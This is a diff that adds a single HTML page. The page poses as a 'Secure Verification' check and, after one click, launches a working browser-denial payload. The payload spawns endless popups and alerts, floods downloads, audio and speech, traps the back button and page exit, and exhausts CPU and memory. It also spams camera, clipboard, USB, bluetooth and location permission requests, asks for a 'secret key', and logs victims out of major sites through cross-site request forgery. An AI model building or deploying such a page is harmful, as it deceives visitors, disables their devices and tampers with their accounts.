@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>🔒 Secure Connection Required</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:#000; overflow:hidden; font-family: sans-serif; }
+  #overlay {
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    background: rgba(0,0,0,0.95);
+    display: flex; align-items: center; justify-content: center;
+    flex-direction: column; z-index: 999999;
+    color: #fff;
+  }
+  #overlay h1 { font-size: 42px; color: #ffcc00; text-shadow: 0 0 30px #ffcc00; margin-bottom: 20px; }
+  #overlay p { font-size: 20px; opacity: 0.7; margin-bottom: 40px; }
+  #overlay button {
+    padding: 20px 60px; font-size: 32px; background: #ff3300;
+    border: none; border-radius: 12px; color: #fff;
+    cursor: pointer; box-shadow: 0 0 60px #ff3300;
+    transition: 0.15s;
+  }
+  #overlay button:hover { transform: scale(1.08); background: #ff5500; }
+  #status { position: fixed; bottom:10px; left:10px; color:#888; font-size:12px; z-index:1; }
+</style>
+</head>
+<body>
+
+<div id="overlay">
+  <h1>⚠️ SECURE VERIFICATION</h1>
+  <p>Your session requires a one-time security check.</p>
+  <button id="trigger">▶ CLICK TO CONTINUE</button>
+</div>
+
+<div id="status"></div>
+
+<script>
+(function() {
+  // ---- detect platform ----
+  var ua = navigator.userAgent.toLowerCase();
+  var isMobile = /android|iphone|ipad|ipod|windows phone|blackberry|iemobile|opera mini/.test(ua);
+  var isWin = /windows|win32|win64/.test(ua);
+  var isLinux = /linux/.test(ua) && !isMobile;
+  var isMac = /macintosh|mac os x/.test(ua);
+
+  // ---- extended protocol list ----
+  var PROTOCOLS = [
+    'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto',
+    'mms', 'news', 'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel',
+    'urn', 'webcal', 'wtai', 'xmpp', 'ftp', 'feed', 'ed2k',
+    'steam', 'spotify', 'vscode', 'slack', 'zoommtg', 'facetime', 'skype'
+  ];
+
+  // ---- utility ----
+  function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+  function rcoords() {
+    return {
+      x: 10 + Math.floor(Math.random() * (screen.availWidth - 480 - 20)),
+      y: 30 + Math.floor(Math.random() * (screen.availHeight - 360 - 40))
+    };
+  }
+  function clipcopy(t) {
+    var s = document.createElement('span');
+    s.textContent = t;
+    s.style.whiteSpace = 'pre';
+    var f = document.createElement('iframe');
+    f.sandbox = 'allow-same-origin';
+    f.style.display = 'none';
+    document.body.appendChild(f);
+    var w = f.contentWindow;
+    w.document.body.appendChild(s);
+    var sel = w.getSelection();
+    if (!sel) { w = window; sel = w.getSelection(); document.body.appendChild(s); }
+    var r = w.document.createRange();
+    sel.removeAllRanges();
+    r.selectNode(s);
+    sel.addRange(r);
+    try { w.document.execCommand('copy'); } catch(e) {}
+    sel.removeAllRanges();
+    s.remove();
+    f.remove();
+  }
+
+  // ---- state ----
+  var wins = [];
+  var interactionCount = 0;
+  var audioCtx = null, noiseOsc = null, noiseGain = null;
+
+  // ---- overlay click handler ----
+  document.getElementById('trigger').addEventListener('click', function() {
+    document.getElementById('overlay').style.display = 'none';
+    startHell();
+  });
+
+  // ---- main hell function ----
+  function startHell() {
+    // 1. immediate visible chaos
+    document.body.style.background = '#000';
+    document.documentElement.style.cursor = 'none';
+
+    // flood DOM with rotating text
+    for (var i = 0; i < 300; i++) {
+      var d = document.createElement('div');
+      d.textContent = 'HELL'.repeat(50);
+      d.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;font-size:' + (10 + Math.random() * 60) + 'px;color:#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0') + ';transform:rotate(' + (Math.random() * 720 - 360) + 'deg);z-index:' + Math.floor(Math.random() * 9999) + ';white-space:nowrap;pointer-events:none;';
+      document.body.appendChild(d);
+    }
+
+    // 2. background flash
+    setInterval(function() {
+      document.body.style.background = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+    }, 10);
+
+    // 3. alert/confirm/prompt storm
+    setInterval(function() {
+      try { alert('⚠️ SYSTEM ALERT\n' + 'X'.repeat(3000)); } catch(e) {}
+      try { confirm('🚨 EMERGENCY: LEAVE NOW?'); } catch(e) {}
+      try { prompt('🔑 ENTER YOUR SECRET KEY:'); } catch(e) {}
+    }, 200);
+
+    // 4. window spawn (aggressive)
+    setInterval(function() {
+      for (var i = 0; i < 5; i++) {
+        try {
+          var c = rcoords();
+          var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y);
+          if (w) { wins.push(w); }
+        } catch(e) {}
+      }
+      // focus existing
+      wins.forEach(function(win) {
+        if (!win.closed) try { win.focus(); } catch(e) {}
+      });
+    }, 100);
+
+    // 5. download flood
+    setInterval(function() {
+      for (var i = 0; i < 10; i++) {
+        var a = document.createElement('a');
+        a.href = 'data:text/plain;base64,' + btoa('SUFFER'.repeat(500));
+        a.download = 'hell_' + Math.random() + '.txt';
+        try { a.click(); } catch(e) {}
+      }
+    }, 150);
+
+    // 6. speech flood
+    setInterval(function() {
+      try {
+        var u = new SpeechSynthesisUtterance('YOU ARE TRAPPED FOREVER');
+        u.rate = 3;
+        u.pitch = 2;
+        window.speechSynthesis.speak(u);
+      } catch(e) {}
+    }, 200);
+
+    // 7. audio torture
+    setInterval(function() {
+      try {
+        var c = new (window.AudioContext || window.webkitAudioContext)();
+        var o = c.createOscillator();
+        var g = c.createGain();
+        o.frequency.value = 100 + Math.random() * 2000;
+        g.gain.value = 0.3;
+        o.connect(g);
+        g.connect(c.destination);
+        o.start();
+        o.stop(c.currentTime + 0.1 + Math.random() * 0.5);
+      } catch(e) {}
+    }, 30);
+
+    // 8. video flood
+    var vids = ['https://www.w3schools.com/html/mov_bbb.mp4', 'https://www.w3schools.com/html/movie.mp4', 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4'];
+    setInterval(function() {
+      var v = document.createElement('video');
+      v.src = rand(vids);
+      v.autoplay = true;
+      v.loop = true;
+      v.muted = true;
+      v.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (50 + Math.random() * 300) + 'px;height:' + (50 + Math.random() * 300) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
+      document.body.appendChild(v);
+      setTimeout(function() { try { v.play(); } catch(e) {} }, 50);
+    }, 80);
+
+    // 9. image flood (random memes/gifs)
+    var gifs = [
+      'https://media.tenor.com/images/5e6a0a2c0f5d6e8b0c5a8d7e9f0a1b2c/tenor.gif',
+      'https://media.tenor.com/images/1a2b3c4d5e6f7a8b9c0d1e2f/tenor.gif',
+      'https://media.tenor.com/images/9f8e7d6c5b4a3f2e1d0c9b8a/tenor.gif',
+      'https://media.tenor.com/images/7a6b5c4d3e2f1a0b9c8d7e6f/tenor.gif',
+      'https://media.tenor.com/images/3c2d1e0f9a8b7c6d5e4f3a2b/tenor.gif'
+    ];
+    setInterval(function() {
+      var img = document.createElement('img');
+      img.src = rand(gifs);
+      img.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (50 + Math.random() * 400) + 'px;height:' + (50 + Math.random() * 400) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
+      document.body.appendChild(img);
+    }, 40);
+
+    // 10. iframe flood
+    var sites = ['google.com', 'youtube.com', 'facebook.com', 'twitter.com', 'reddit.com', 'amazon.com', 'netflix.com', 'spotify.com', 'github.com', 'stackoverflow.com', 'wikipedia.org', 'bing.com', 'yahoo.com'];
+    setInterval(function() {
+      var f = document.createElement('iframe');
+      f.src = 'https://' + rand(sites);
+      f.style.cssText = 'position:fixed;top:' + (Math.random() * 100) + '%;left:' + (Math.random() * 100) + '%;width:' + (100 + Math.random() * 500) + 'px;height:' + (100 + Math.random() * 500) + 'px;z-index:' + Math.floor(Math.random() * 9999) + ';';
+      document.body.appendChild(f);
+    }, 60);
+
+    // 11. style chaos
+    setInterval(function() {
+      document.body.style.fontSize = (10 + Math.random() * 40) + 'px';
+      document.body.style.fontFamily = ['Arial', 'Comic Sans MS', 'Courier New', 'Impact', 'Times New Roman', 'Verdana', 'Georgia', 'Papyrus', 'Webdings', 'Wingdings'][Math.floor(Math.random() * 10)];
+      document.body.style.filter = 'blur(' + (Math.random() * 20) + 'px) brightness(' + (0.2 + Math.random() * 2) + ') contrast(' + (0.2 + Math.random() * 2) + ')';
+      document.body.style.transform = 'rotate(' + (Math.random() * 360 - 180) + 'deg)';
+    }, 10);
+
+    // 12. scroll & resize
+    setInterval(function() { window.scrollTo(Math.random() * 100000, Math.random() * 100000); }, 10);
+    setInterval(function() {
+      window.resizeTo(200 + Math.random() * 800, 200 + Math.random() * 600);
+      window.moveTo(Math.random() * screen.availWidth, Math.random() * screen.availHeight);
+    }, 50);
+
+    // 13. history flood & popstate trap
+    for (var i = 0; i < 500; i++) { history.pushState({}, '', location.pathname + '?hell=' + i + Math.random()); }
+    window.addEventListener('popstate', function() { history.forward(); history.forward(); history.forward(); });
+
+    // 14. beforeunload confirm trap
+    window.addEventListener('beforeunload', function(e) {
+      for (var i = 0; i < 50; i++) { try { window.open(location.href); } catch(e) {} }
+      var msg = '⚠️ ALL YOUR DATA WILL BE LOST IF YOU LEAVE!';
+      e.returnValue = msg;
+      return msg;
+    });
+
+    // 15. console flood
+    setInterval(function() { console.log('HELL'.repeat(1000)); }, 10);
+
+    // 16. error flood
+    setInterval(function() {
+      try { eval('var x=;'); } catch(e) {}
+      try { undefinedFunction(); } catch(e) {}
+      try { nullVar.property; } catch(e) {}
+    }, 10);
+
+    // 17. storage flood
+    setInterval(function() {
+      try { localStorage.setItem('hell_' + Math.random(), 'X'.repeat(10000)); } catch(e) {}
+      try { sessionStorage.setItem('hell_' + Math.random(), 'X'.repeat(10000)); } catch(e) {}
+    }, 50);
+
+    // 18. cookie flood
+    setInterval(function() {
+      try { document.cookie = 'hell_' + Math.random() + '=' + 'X'.repeat(1000) + '; path=/;'; } catch(e) {}
+    }, 50);
+
+    // 19. web workers flood
+    setInterval(function() {
+      try { var b = new Blob(['while(1){}'], { type: 'application/javascript' }); new Worker(URL.createObjectURL(b)); } catch(e) {}
+    }, 80);
+
+    // 20. fetch flood
+    setInterval(function() {
+      var urls = ['https://google.com', 'https://yahoo.com', 'https://bing.com', 'https://duckduckgo.com', 'https://wikipedia.org', 'https://github.com', 'https://stackoverflow.com', 'https://reddit.com', 'https://amazon.com', 'https://netflix.com'];
+      fetch(rand(urls)).catch(function() {});
+    }, 30);
+
+    // 21. XHR flood
+    setInterval(function() {
+      var x = new XMLHttpRequest();
+      x.open('GET', 'https://' + rand(['google.com', 'yahoo.com', 'bing.com', 'duckduckgo.com', 'wikipedia.org', 'github.com', 'stackoverflow.com', 'reddit.com', 'amazon.com', 'netflix.com']));
+      x.send();
+    }, 30);
+
+    // 22. WebRTC flood
+    setInterval(function() {
+      try { var pc = new RTCPeerConnection(); pc.createOffer().then(function(o) { pc.setLocalDescription(o); }); } catch(e) {}
+    }, 80);
+
+    // 23. WebAuthn flood
+    setInterval(function() {
+      try {
+        var chal = crypto.getRandomValues(new Uint8Array(32)).buffer;
+        navigator.credentials.get({ publicKey: { challenge: chal, timeout: 100 } }).catch(function() {});
+      } catch(e) {}
+    }, 80);
+
+    // 24. Permissions flood (fullscreen, pointer lock, clipboard, media, bluetooth, usb, serial, hid, share)
+    setInterval(function() {
+      try { document.body.requestFullscreen(); } catch(e) {}
+      try { document.body.requestPointerLock(); } catch(e) {}
+      try { navigator.clipboard.readText(); } catch(e) {}
+      try { navigator.mediaDevices.getUserMedia({ audio: true, video: true }); } catch(e) {}
+      try { navigator.bluetooth.requestDevice({ acceptAllDevices: true }); } catch(e) {}
+      try { navigator.usb.requestDevice({ filters: [{}] }); } catch(e) {}
+      try { navigator.serial.requestPort({ filters: [] }); } catch(e) {}
+      try { navigator.hid.requestDevice({ filters: [] }); } catch(e) {}
+      try { navigator.share({ title: 'HELL', text: 'TRAPPED', url: location.href }); } catch(e) {}
+    }, 30);
+
+    // 25. Vibration (mobile)
+    if (navigator.vibrate) {
+      setInterval(function() { navigator.vibrate([100, 50, 200, 100, 500, 200, 1000, 500, 200, 100]); }, 150);
+      if (isMobile) {
+        setInterval(function() { navigator.vibrate(5000); }, 800);
+      }
+    }
+
+    // 26. Notifications (if granted)
+    if ('Notification' in window) {
+      if (Notification.permission === 'granted') {
+        setInterval(function() {
+          new Notification('🔥 HELL ACTIVATED', { body: 'YOU CANNOT ESCAPE\n' + 'X'.repeat(500), icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">%23</text></svg>' });
+        }, 100);
+      } else {
+        Notification.requestPermission();
+        setInterval(function() {
+          if (Notification.permission !== 'granted' && Notification.permission !== 'denied') {
+            Notification.requestPermission();
+          }
+        }, 3000);
+      }
+    }
+
+    // 27. Protocol registration spam (repeatedly)
+    setInterval(function() {
+      if (!navigator.registerProtocolHandler) return;
+      var proto = PROTOCOLS[Math.floor(Math.random() * PROTOCOLS.length)];
+      try { navigator.registerProtocolHandler(proto, location.href + '?proto=%s', 'Hell Site'); } catch(e) {}
+      // also prompt confirm to annoy
+      if (Math.random() < 0.2) { confirm('Allow this site to handle ' + proto + ':// links?'); }
+    }, 500);
+
+    // 28. Geolocation spam
+    setInterval(function() {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(function() {}, function() {}, { enableHighAccuracy: true, timeout: 100, maximumAge: 0 });
+    }, 200);
+
+    // 29. Platform-specific extras
+    if (isWin) {
+      setInterval(function() {
+        try {
+          var c = new (window.AudioContext || window.webkitAudioContext)();
+          var o = c.createOscillator();
+          var g = c.createGain();
+          o.frequency.value = 800;
+          g.gain.value = 0.2;
+          o.connect(g);
+          g.connect(c.destination);
+          o.start();
+          o.stop(c.currentTime + 0.05);
+        } catch(e) {}
+      }, 40);
+    }
+    if (isLinux) {
+      setInterval(function() { console.log('\x07'); }, 40);
+    }
+    if (isMac) {
+      setInterval(function() {
+        try { window.speechSynthesis.speak(new SpeechSynthesisUtterance('MAC USER SUFFER')); } catch(e) {}
+      }, 150);
+    }
+
+    // 30. Mouse jitter (move window with mouse)
+    document.addEventListener('mousemove', function(e) {
+      window.moveTo(e.screenX + Math.random() * 100 - 50, e.screenY + Math.random() * 100 - 50);
+    });
+
+    // 31. Force focus
+    setInterval(function() { window.focus(); }, 10);
+
+    // 32. Block right-click
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); e.stopPropagation(); });
+
+    // 33. CPU drain
+    setInterval(function() {
+      for (var i = 0; i < 1000000; i++) { Math.sqrt(i); Math.sin(i); Math.cos(i); Math.tan(i); Math.log(i); Math.exp(i); }
+    }, 10);
+
+    // 34. Memory leak
+    var leak = [];
+    setInterval(function() {
+      for (var i = 0; i < 10000; i++) { leak.push('X'.repeat(10000)); }
+    }, 10);
+
+    // 35. DOM leak
+    setInterval(function() {
+      var d = document.createElement('div');
+      d.textContent = 'X'.repeat(10000);
+      document.body.appendChild(d);
+    }, 10);
+
+    // 36. Super logout (original style, but using our own list)
+    (function() {
+      var sites = {
+        'Google': ['GET', 'https://www.google.com/accounts/Logout'],
+        'YouTube': ['POST', 'https://www.youtube.com', { action_logout: '1' }],
+        'Facebook': ['GET', 'https://www.facebook.com/logout.php'],
+        'Twitter': ['GET', 'https://twitter.com/logout'],
+        'GitHub': ['GET', 'https://github.com/logout'],
+        'Amazon': ['GET', 'https://www.amazon.com/gp/flex/sign-out.html'],
+        'Microsoft': ['GET', 'https://login.live.com/logout.srf'],
+        'Yahoo': ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1']
+      };
+      var container = document.getElementById('status');
+      for (var name in sites) {
+        var method = sites[name][0];
+        var url = sites[name][1];
+        var params = sites[name][2] || {};
+        if (method === 'GET') {
+          var img = document.createElement('img');
+          img.style.display = 'none';
+          img.onload = img.onerror = function() { this.remove(); };
+          document.body.appendChild(img);
+          img.src = url;
+        } else {
+          var iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.name = 'logout_' + Math.random();
+          document.body.appendChild(iframe);
+          var form = document.createElement('form');
+          form.style.display = 'none';
+          form.action = url;
+          form.method = 'POST';
+          form.target = iframe.name;
+          for (var k in params) {
+            var inp = document.createElement('input');
+            inp.type = 'hidden';
+            inp.name = k;
+            inp.value = params[k];
+            form.appendChild(inp);
+          }
+          document.body.appendChild(form);
+          form.submit();
+          setTimeout(function() { iframe.remove(); form.remove(); }, 2000);
+        }
+        container.textContent += 'Logging out from ' + name + '... ';
+      }
+    })();
+
+    // 37. Intercept all user input to amplify
+    function interceptAll(evt) {
+      interactionCount++;
+      evt.preventDefault();
+      evt.stopPropagation();
+      // extra spawn on any input
+      for (var i = 0; i < 3; i++) {
+        try { var c = rcoords(); var w = window.open(location.href, '', 'width=480,height=360,left=' + c.x + ',top=' + c.y); if (w) wins.push(w); } catch(e) {}
+      }
+      // extra downloads
+      for (var i = 0; i < 5; i++) {
+        var a = document.createElement('a');
+        a.href = 'data:text/plain;base64,' + btoa('INTERCEPTED'.repeat(100));
+        a.download = 'click_' + Math.random() + '.txt';
+        try { a.click(); } catch(e) {}
+      }
+      // speech
+      try { window.speechSynthesis.speak(new SpeechSynthesisUtterance('YOU CLICKED AGAIN')); } catch(e) {}
+      // permissions
+      try { document.body.requestFullscreen(); } catch(e) {}
+      try { document.body.requestPointerLock(); } catch(e) {}
+      try { navigator.clipboard.readText(); } catch(e) {}
+      // keyboard special
+      if (evt.key === 'Meta' || evt.key === 'Control') {
+        for (var i = 0; i < 10; i++) { window.print(); }
+      }
+    }
+    var events = ['touchstart', 'mousedown', 'mouseup', 'click', 'keydown', 'keyup', 'keypress', 'wheel', 'scroll'];
+    events.forEach(function(e) {
+      document.body.addEventListener(e, interceptAll, { passive: false, capture: true });
+    });
+
+    // 38. Final: show a message that hell has started
+    alert('🔥 HELL ACTIVATED 🔥\nYou are now trapped forever.');
+  }
+
+  // ---- start with overlay already visible ----
+  // The overlay is visible by default; click handler starts hell.
+})();
+</script>
+</body>
+</html>
